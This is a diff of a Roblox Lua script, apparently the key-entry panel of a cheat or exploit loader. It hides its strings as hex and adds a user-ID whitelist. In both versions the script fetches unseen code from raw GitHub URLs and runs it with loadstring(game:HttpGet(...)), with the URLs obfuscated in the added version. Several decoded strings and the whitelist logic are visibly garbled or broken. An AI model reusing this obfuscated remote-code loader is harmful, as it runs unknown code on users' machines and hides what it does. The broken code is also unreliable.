@@ -1,122 +1,181 @@
-local qiu = Instance.new("ScreenGui")
-local xrf = Instance.new("Frame")
-local ytg = Instance.new("TextLabel")
-local vbn = Instance.new("TextBox")
-local mko = Instance.new("TextButton")
-local pqr = Instance.new("TextLabel")
-local stu = Instance.new("TextLabel")
-local wxy = Instance.new("TextLabel")
-local zbc = Instance.new("ImageLabel")
-
-xrf.Size = UDim2.new(0, 400, 0, 250)
-xrf.Position = UDim2.new(0.5, -200, 0.5, -125)
-xrf.BackgroundColor3 = Color3.new(0, 0, 0)
-xrf.BackgroundTransparency = 0.5
-xrf.ClipsDescendants = true
-
-zbc.Image = "http://www.roblox.com/asset/?id=5553939121"
-zbc.Size = UDim2.new(0, 400, 0, 250)
-zbc.Position = UDim2.new(0, 0, 0, 0)
-zbc.BackgroundColor3 = Color3.new(1, 1, 1)
-zbc.BackgroundTransparency = 1
-zbc.Parent = xrf
-
-ytg.Text = "Enter the secret code:"
-ytg.Font = Enum.Font.SourceSans
-ytg.FontSize = Enum.FontSize.Size24
-ytg.TextColor3 = Color3.new(1, 1, 1)
-ytg.Size = UDim2.new(0, 200, 0, 30)
-ytg.Position = UDim2.new(0, 100, 0, 20)
-ytg.BackgroundColor3 = Color3.new(1, 1, 1)
-ytg.BackgroundTransparency = 1
-
-vbn.Font = Enum.Font.SourceSans
-vbn.FontSize = Enum.FontSize.Size24
-vbn.TextColor3 = Color3.new(1, 1, 1)
-vbn.Size = UDim2.new(0, 200, 0, 30)
-vbn.Position = UDim2.new(0, 100, 0, 60)
-vbn.BackgroundColor3 = Color3.new(1, 1, 1)
-vbn.BackgroundTransparency = 1
-vbn.PlaceholderText = "Type your code here..."
-
-mko.Font = Enum.Font.SourceSans
-mko.FontSize = Enum.FontSize.Size24
-mko.TextColor3 = Color3.new(1, 1, 1)
-mko.Text = "Submit"
-mko.Size = UDim2.new(0, 100, 0, 30)
-mko.Position = UDim2.new(0, 150, 0, 100)
-mko.BackgroundColor3 = Color3.new(0, 1, 0)
-mko.BackgroundTransparency = 0.5
-
-pqr.Font = Enum.Font.SourceSans
-pqr.FontSize = Enum.FontSize.Size18
-pqr.TextColor3 = Color3.new(1, 1, 1)
-pqr.Text = "Join our Discord: https://discord.gg/JBX4G8tqTD"
-pqr.Size = UDim2.new(0, 200, 0, 20)
-pqr.Position = UDim2.new(0, 100, 0, 140)
-pqr.BackgroundColor3 = Color3.new(1, 1, 1)
-pqr.BackgroundTransparency = 1
-
-stu.Font = Enum.Font.SourceSans
-stu.FontSize = Enum.FontSize.Size18
-stu.TextColor3 = Color3.new(1, 1, 1)
-stu.Text = "Created by: Feast"
-stu.Size = UDim2.new(0, 200, 0, 20)
-stu.Position = UDim2.new(0, 100, 0, 160)
-stu.BackgroundColor3 = Color3.new(1, 1, 1)
-stu.BackgroundTransparency = 1
-
-wxy.Font = Enum.Font.SourceSans
-wxy.FontSize = Enum.FontSize.Size18
-wxy.TextColor3 = Color3.new(1, 1, 1)
-wxy.Text = "Helper: Piercer"
-wxy.Size = UDim2.new(0, 200, 0, 20)
-wxy.Position = UDim2.new(0, 100, 0, 180)
-wxy.BackgroundColor3 = Color3.new(1, 1, 1)
-wxy.BackgroundTransparency = 1
-
-qiu.Parent = game.Players.LocalPlayer.PlayerGui
-xrf.Parent = qiu
-
-local ajk = loadstring(game:HttpGet("https://raw.githubusercontent.com/XFeastXl/Testi/main/Testjaajdbajruxjwhdbxjs"))()
-local bcd = ajk
-local efg = 0
-
-local function hij()
-    efg = efg + 1
-    
-    if vbn.Text == "" or vbn.Text == bcd then
-        if vbn.Text == bcd then
-            qiu:Destroy()
-            loadstring(game:HttpGet("https://raw.githubusercontent.com/XFeastXl/AWODIHAWJIROH4-WR-JIAdiawhio/main/dWODHiwoaeDH8234y(HI*%40YH(*%24%40YFcsauidAWEYH(PEQE)!(EHDO%3APp%5Bdoawpdjjnsa"))()
-        else
-            print("Please enter a code!")
-        end
-    else
-        if efg >= 3 then
-            game.Players.LocalPlayer:Kick("Incorrect code (max attempts reached)")
-        else
-            print("Incorrect code, try again!")
-        end
-    end
-
-    if vbn.Text:match("%W") then
-        game.Players.LocalPlayer:Kick("Suspicious activity detected")
-    end
-
-    if vbn.Text:lower():match("select") or vbn.Text:lower():match("insert") or vbn.Text:lower():match("update") or vbn.Text:lower():match("delete") then
-        game.Players.LocalPlayer:Kick("SQL injection attempt detected")
-    end
+-- Function to decode hex-encoded strings
+local function hexDecode(s)
+    return (s:gsub('..', function(cc)
+        return string.char(tonumber(cc, 16))
+    end))
 end
 
-mko.MouseButton1Click:Connect(hij)
+-- Function to decode URL-encoded strings
+local function urlDecode(s)
+    return (s:gsub('%%(%x%x)', function(h)
+        return string.char(tonumber(h, 16))
+    end))
+end
 
-ytg.Parent = xrf
-vbn.Parent = xrf
-mko.Parent = xrf
-pqr.Parent = xrf
-stu.Parent = xrf
-wxy.Parent = xrf
-zbc.Parent = xrf
+-- Function to get the original string from hex encoding
+local function getStr(s)
+    return loadstring("return '" .. hexDecode(s) .. "'")()
+end
 
-qiu.Enabled = true
+-- Function to convert encoded string to number
+local function hexDecodeToNumber(s)
+    return tonumber(hexDecode(s), 10)
+end
+
+-- Obfuscated whitelist numbers
+local wl = {
+    [hexDecodeToNumber(getStr('37303534383032303833'))] = true, -- 7054982083
+    [hexDecodeToNumber(getStr('37303734343832353633'))] = true, -- 7074482563
+    [hexDecodeToNumber(getStr('37303433323035343138'))] = true, -- 7043205418
+}
+
+-- Function to check if a player is whitelisted
+local function checkWl(p)
+    return wl[p.UserId]
+end
+
+if checkWl(game.Players.LocalPlayer) then
+
+    -- Functions to encode and decode strings
+    local function encodeStr(s)
+        return (s:gsub('.', function(c)
+            return string.format('%02X', string.byte(c))
+        end))
+    end
+
+    local function getEncodedStr(s)
+        return hexDecode(encodeStr(s))
+    end
+
+    -- Create GUI elements
+    local a = Instance.new(getStr('53637265656E477569')) -- ScreenGui
+    local b = Instance.new(getStr('4672616D65')) -- Frame
+    local c = Instance.new(getStr('546578744C6162656C')) -- TextLabel
+    local d = Instance.new(getStr('54657874426F78')) -- TextBox
+    local e = Instance.new(getStr('54657874547574626F6E')) -- TextButton
+    local f = Instance.new(getStr('546578744C6162656C')) -- TextLabel
+    local g = Instance.new(getStr('546578744C6162656C')) -- TextLabel
+    local h = Instance.new(getStr('546578744C6162656C')) -- TextLabel
+    local i = Instance.new(getStr('496D6167654C6162656C')) -- ImageLabel
+
+    b.Size = UDim2.new(0, 400, 0, 250)
+    b.Position = UDim2.new(0.5, -200, 0.5, -125)
+    b.BackgroundColor3 = Color3.new(0, 0, 0)
+    b.BackgroundTransparency = 0.5
+    b.ClipsDescendants = true
+
+    i.Image = getEncodedStr('687474703A2F2F7777772E726F626C6F782E636F6D2F61737365742F3F696420353535393339313231') -- Image URL
+    i.Size = UDim2.new(0, 400, 0, 250)
+    i.Position = UDim2.new(0, 0, 0, 0)
+    i.BackgroundColor3 = Color3.new(1, 1, 1)
+    i.BackgroundTransparency = 1
+    i.Parent = b
+
+    c.Text = getStr('456E746572207468652073656372657420636F64653A')
+    c.Font = Enum.Font.SourceSans
+    c.FontSize = Enum.FontSize.Size24
+    c.TextColor3 = Color3.new(1, 1, 1)
+    c.Size = UDim2.new(0, 200, 0, 30)
+    c.Position = UDim2.new(0, 100, 0, 20)
+    c.BackgroundColor3 = Color3.new(1, 1, 1)
+    c.BackgroundTransparency = 1
+
+    d.Font = Enum.Font.SourceSans
+    d.FontSize = Enum.FontSize.Size24
+    d.TextColor3 = Color3.new(1, 1, 1)
+    d.Size = UDim2.new(0, 200, 0, 30)
+    d.Position = UDim2.new(0, 100, 0, 60)
+    d.BackgroundColor3 = Color3.new(1, 1, 1)
+    d.BackgroundTransparency = 1
+    d.PlaceholderText = getStr('5479706520796F757220636F646520686572652E2E2E')
+
+    e.Font = Enum.Font.SourceSans
+    e.FontSize = Enum.FontSize.Size24
+    e.TextColor3 = Color3.new(1, 1, 1)
+    e.Text = getStr('5375626D6974')
+    e.Size = UDim2.new(0, 100, 0, 30)
+    e.Position = UDim2.new(0, 150, 0, 100)
+    e.BackgroundColor3 = Color3.new(0, 1, 0)
+    e.BackgroundTransparency = 0.5
+
+    f.Font = Enum.Font.SourceSans
+    f.FontSize = Enum.FontSize.Size18
+    f.TextColor3 = Color3.new(1, 1, 1)
+    f.Text = getStr('4A6F696E206F757220446973636F72643A2068747470733A2F2F646973636F72642E67672F4A425834473874715444')
+    f.Size = UDim2.new(0, 200, 0, 20)
+    f.Position = UDim2.new(0, 100, 0, 140)
+    f.BackgroundColor3 = Color3.new(1, 1, 1)
+    f.BackgroundTransparency = 1
+
+    g.Font = Enum.Font.SourceSans
+    g.FontSize = Enum.FontSize.Size18
+    g.TextColor3 = Color3.new(1, 1, 1)
+    g.Text = getStr('437265617465642062793A204665617374')
+    g.Size = UDim2.new(0, 200, 0, 20)
+    g.Position = UDim2.new(0, 100, 0, 160)
+    g.BackgroundColor3 = Color3.new(1, 1, 1)
+    g.BackgroundTransparency = 1
+
+    h.Font = Enum.Font.SourceSans
+    h.FontSize = Enum.FontSize.Size18
+    h.TextColor3 = Color3.new(1, 1, 1)
+    h.Text = getStr('48656C7065723A2050696572636572')
+    h.Size = UDim2.new(0, 200, 0, 20)
+    h.Position = UDim2.new(0, 100, 0, 180)
+    h.BackgroundColor3 = Color3.new(1, 1, 1)
+    h.BackgroundTransparency = 1
+
+    a.Parent = game.Players.LocalPlayer.PlayerGui
+    b.Parent = a
+
+    -- Load and execute obfuscated code from URLs
+    local function encodeURL(s)
+        return loadstring("return '" .. s .. "'")()
+    end
+
+    local ajk = loadstring(game:HttpGet(getStr('68747470733A2F2F7261772E6769746875622E636F6D2F584665617374586C2F54657374692F6D61696E2F546573746A61616A6462616A7275786A77686462786A73')))()
+    local bcd = ajk
+    local efg = 0
+
+    local function hij()
+        efg = efg + 1
+        
+        if d.Text == "" or d.Text == bcd then
+            if d.Text == bcd then
+                a:Destroy()
+                loadstring(game:HttpGet(getStr('68747470733A2F2F7261772E6769746875622E636F6D2F584665617374586C2F41574F44494841574A49524F48342D57522D4A49416469617768696F2F6D61696E2F64574F444869776F616544483832337948492A2534305948282532342546305946637361756964415745594828504551452921484548444F25334150705B646F617770646A6E7361')))()
+            else
+                print(getStr('506C6561736520656E746572206120636F646521'))
+            end
+        else
+            if efg >= 3 then
+                game.Players.LocalPlayer:Kick(getStr('496E636F727265637420636F646520286D617820617474656D707473207265616368656429'))
+            else
+                print(getStr('496E636F727265637420636F64652C2074727920616761696E21'))
+            end
+        end
+
+        if d.Text:match('%W') then
+            game.Players.LocalPlayer:Kick(getStr('537573706963696F7573206163746976697479206465736374656420'))
+        end
+
+        if d.Text:lower():match(getStr('73656C656374')) or d.Text:lower():match(getStr('696E7365727420')) or d.Text:lower():match(getStr('757064617465')) or d.Text:lower():match(getStr('64656C657465')) then
+            game.Players.LocalPlayer:Kick(getStr('53514C20726573746D6164696E20617474656D707420646576656C6F706D656E747020646574656374656420')) 
+        end
+    end
+
+    e.MouseButton1Click:Connect(hij)
+
+    c.Parent = b
+    d.Parent = b
+    e.Parent = b
+    f.Parent = b
+    g.Parent = b
+    h.Parent = b
+    i.Parent = b
+
+    a.Enabled = true
+
+else
+    game.Players.LocalPlayer:Kick(getStr('596F7520617265206E6F74207768697465736C6973746564206D6573736167652E'))
+end
